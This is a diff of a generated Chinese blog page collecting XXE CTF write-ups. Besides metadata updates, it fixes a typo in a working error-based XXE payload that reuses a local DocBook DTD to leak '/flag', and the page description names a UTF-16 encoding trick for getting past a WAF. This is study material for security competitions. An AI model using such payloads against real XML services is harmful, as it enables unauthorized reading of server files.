@@ -92,7 +92,7 @@
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/54907627-f3d6d000-4f20-11e9-860d-e967349bb159.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/54907916-ab6be200-4f21-11e9-9471-bff46378d15d.png">
-<meta property="og:updated_time" content="2020-01-13T14:27:05.839Z">
+<meta property="og:updated_time" content="2020-02-08T11:22:41.484Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE 题型记录[working forever]">
 <meta name="twitter:description" content="CSAWQual 2019 Web_Unagi 让我们上传xml文件并查看, 使用常规类型来读取发现被waf拦截, 根据wp转utf16绕过 1cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x16.xml 123456789101112131415161718192021&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;!DOCTYPE use">
@@ -336,8 +336,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2020-01-13T22:27:05+08:00">
-                2020-01-13
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-08T19:22:41+08:00">
+                2020-02-08
               </time>
             
           </span>
@@ -430,7 +430,7 @@
 <h2 id="GoogleCTF2019-Quals-Bnv">GoogleCTF2019 Quals Bnv</h2>
 <p>翻翻源码知道了这是一个xxe</p>
 <p>引用外部dtd文件并重新定义参数实体</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ETITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="SecurinetsCTF-2019-feedback">SecurinetsCTF-2019 feedback</h2>
 <p>进入页面。<br>
 然后随便发一点什么东西试一试：<br>
@@ -557,7 +557,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -683,7 +683,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">73.6k</span>
+    <span title="Site words total count">74.6k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
